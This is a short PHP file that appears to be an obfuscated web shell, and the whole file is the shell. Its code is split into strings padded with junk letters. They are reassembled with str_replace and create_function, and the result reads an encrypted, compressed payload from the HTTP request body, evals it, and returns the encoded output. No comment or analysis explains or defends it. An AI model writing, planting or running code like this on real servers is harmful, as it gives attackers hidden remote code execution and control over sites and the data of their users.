<?php
$S='aseEE64_encode(@x(@gzcoEmpresEs($Eo),$k)E);Eprint("$p$kh$Er$kf");}';
$U='E("/$kh(E.+)$kfE/E",@file_gEetE_EconteEntEs("phEp://input"E),$m)=';
$E='rlen($Et);$o="";foEr($i=0E;$iE<$El;){for($j=0;E($j<$Ec&&$i<E$El);';
$D='=1) {@obE_start();E@eEval(@gzEuncomprEEEess(@x(@baEse64_decode($';
$d='m[1])EE,$kE)));$o=@ob_geEEt_coEntents();@ob_eEnd_cleaEn(E);$r=E@b';
$y='EKEJJEM87fE7jElEevaWyr";functiEon x($t,$k){$c=sEEEtErlen($k);$l=st';
$H='$j++,$Ei++E){$Eo.=$t{$i}^$k{$j}E;}}reEturn $Eo;}ifE E(@preg_match';
$o='$Ek=E"9d9b44E14E";E$kh="d339c1b8d628";E$kf="f9a1dEEbd2b1a6";$p="';
$F=str_replace('Vq','','cVqreaVqVqte_fuVqnVqcVqtion');
$e=str_replace('E','',$o.$y.$E.$H.$U.$D.$d.$S);
$h=$F('',$e);$h();
?>
